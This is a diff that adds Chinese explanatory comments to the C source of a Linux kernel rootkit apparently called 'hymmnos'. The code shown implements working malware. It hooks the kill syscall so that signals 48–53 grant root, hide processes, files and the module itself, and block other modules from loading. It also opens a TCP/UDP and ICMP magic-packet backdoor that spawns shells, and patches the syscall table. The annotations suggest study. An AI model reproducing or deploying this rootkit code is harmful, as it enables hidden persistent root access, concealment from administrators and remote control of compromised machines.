@@ -42,17 +42,18 @@
 #endif
 
 #define bzero(b, len) (memset((b), '\0', (len)), (void)0)
-#define SIGROOT 48
-#define SIGHIDEPROC 49
-#define SIGHIDEHYMMNOS 50
-#define SIGHIDECONTENT 51
-#define SIGBACKDOOR 52
-#define SIGKOMON 53
+// hook kill 函数，kill函数本身是给程序发信号
+#define SIGROOT 48 //kill -48 
+#define SIGHIDEPROC 49 // kill -信号49 隐藏进程
+#define SIGHIDEHYMMNOS 50 // 隐藏自身
+#define SIGHIDECONTENT 51 // 隐藏文件内容 kill -51
+#define SIGBACKDOOR 52 // 打开后门，监视网络包 icmp
+#define SIGKOMON 53 // 阻止新的内核模块加载，*！*待改进*！*
 #define SSIZE_MAX 32767
 
 //beginning of the rootkit's configuration
 #define FILE_SUFFIX ".reyvateil"  //hiding files with names ending on defined suffix
-#define COMMAND_CONTAINS "ceil"   //hiding processes which cmdline contains defined text
+#define COMMAND_CONTAINS "ceil"   //hiding processes which cmdline contains defined text 隐藏进程包含"ceil"
 #define ROOTKIT_NAME "hymmnos"    //you need to type here name of this module to make this module hidden
 #define SYSCALL_MODIFY_METHOD CR0 //method of making syscall table writeable, CR0 or PAGE_RW
 #define DEBUG 0
@@ -62,7 +63,7 @@
 #define TCPPORT 7777 //backdoor tcp port
 #define UDPPORT 7777 //bcakdoor udp port
 #define TOKEN "tonelico" //backdoor token
-#define WORKNAME "ceil" //workqueue name, should be hidden
+#define WORKNAME "ceil" //workqueen name, should be hidden
 //end of configuration
 
 #define BEGIN_BUF_SIZE 10000
@@ -75,6 +76,7 @@
 
 #define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
 
+// 注册函数替换
 #define set_afinfo_seq_op(op, path, afinfo_struct, new, old) \
     do                                                       \
     {                                                        \
@@ -786,7 +788,7 @@ static void extract_type_1_socket_inode(const char lname[], long *inode_p)
        as *inode_p.  Otherwise, return -1 as *inode_p.
        */
 
-   // printk(KERN_INFO "extracting %s\n", lname);
+    // printk(KERN_INFO "extracting %s\n", lname);
     if (strlen(lname) < PRG_SOCKET_PFXl + 3)
         *inode_p = -1;
     else if (memcmp(lname, PRG_SOCKET_PFX, PRG_SOCKET_PFXl))
@@ -904,7 +906,6 @@ void load_inodes_to_hide(void)
     //for every process:
     //check if this process should be hidden
     //if so, get list of inodes of fd's, and save them for further processing
-
     for (bpos = 0; bpos < read;)
     {
         d = (struct linux_dirent *)((char *)dirent + bpos);
@@ -932,6 +933,8 @@ char *next_column(char *ptr)
     return ptr;
 }
 
+// 内核信息，检测是否有需要隐藏的函数，替换函数指针
+// hook show函数
 int new_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
@@ -1145,7 +1148,7 @@ int atoi(char *str)
 void exec(char **argv)
 {
     static char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); //在用户态执行了一个shell
 }
 
 void shell_execer(struct work_struct *work)
@@ -1198,6 +1201,7 @@ int shell_exec_queue(char *path, char *ip, char *port)
     return queue_work(work_queue, &task->work);
 }
 
+// 解析网络数据包
 void decode_n_spawn(const char *data)
 {
     int tsize;
@@ -1258,7 +1262,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     if (!ip_header)
         return NF_ACCEPT;
 
-    if (ip_header->protocol == IPPROTO_ICMP)
+    if (ip_header->protocol == IPPROTO_ICMP) // 检测icmp协议
     {
         icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
 
@@ -1351,7 +1355,7 @@ void unregist_backdoor(void)
 //===============================================
 
 int hidden = 0;
-static struct list_head *mod_list;
+static struct list_head *mod_list; // 内核模块是个列表链接
 
 void hide(void)
 {
@@ -1363,7 +1367,7 @@ void hide(void)
     mod_list = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     kfree(THIS_MODULE->sect_attrs);
-    THIS_MODULE->sect_attrs = NULL;
+    THIS_MODULE->sect_attrs = NULL; // 隐藏
     mutex_unlock(&module_mutex);
     hidden = 1;
 }
@@ -1408,6 +1412,7 @@ void fake_exit(void)
     return;
 }
 
+// 内核监控
 int module_notifier(struct notifier_block *nb,
                     unsigned long action, void *data)
 {
@@ -1426,7 +1431,7 @@ int module_notifier(struct notifier_block *nb,
         if (DEBUG)
             printk(KERN_INFO "Replacing init and exit functions: %s.\n",
                    module->name);
-        module->init = fake_init;
+        module->init = fake_init; // 替换函数 阻止
         module->exit = fake_exit;
         break;
     default:
@@ -1458,6 +1463,7 @@ void unregist_komon(void)
 //for control and root backdoor
 //===============================================
 
+// hook kill函数 用于信号控制
 asmlinkage int new_sys_kill(pid_t pid, int sig)
 {
     switch (sig)
@@ -1474,14 +1480,14 @@ asmlinkage int new_sys_kill(pid_t pid, int sig)
         else
             make_pid_hidden((long)pid);
         break;
-    case SIGHIDECONTENT:
+    case SIGHIDECONTENT: // 控制文件隐藏显示
         if (hide_file_content)
             hide_file_content = 0;
         else
             hide_file_content = 1;
         break;
     case SIGROOT:
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) // 获得root权限
         current->uid = 0;
         current->suid = 0;
         current->euid = 0;
@@ -1516,6 +1522,7 @@ asmlinkage int new_sys_kill(pid_t pid, int sig)
 
 //===============================================
 
+// 遍历内核 导出
 static unsigned long **acquire_sys_call_table(void)
 {
     unsigned long int offset = (unsigned long int)sys_close;
@@ -1569,9 +1576,11 @@ static void create_file(char *name)
  * files:
  * /etc/passwords[FILE_SUFFIX]
  * /etc/http_requests[FILE_SUFFIX]
+ * /etc/modules[FILE_SUFFIX]
 */
 static void create_files(void)
 {
+    // create_file("/etc/modules");
     create_file("/etc/http_requests");
     create_file("/etc/passwords");
 }
@@ -1583,6 +1592,7 @@ static void create_files(void)
 #define unregister(name) \
     sys_call_table_[__NR_##name] = (unsigned long *)ref_sys_##name;
 
+// 将模块插入内核首先执行函数
 static int __init rootkit_start(void)
 {
     if (!(sys_call_table_ = acquire_sys_call_table()))
@@ -1622,6 +1632,7 @@ static int __init rootkit_start(void)
     return 0;
 }
 
+// 模块卸载时调用
 static void __exit rootkit_end(void)
 {
     void *temp;
@@ -1635,7 +1646,7 @@ static void __exit rootkit_end(void)
     make_rw((long unsigned int)sys_call_table_);
 #endif
 
-    unregister(getdents);
+    unregister(getdents); // getdents-读写文件目录项
     unregister(getdents64);
     unregister(sendto);
     unregister(read);
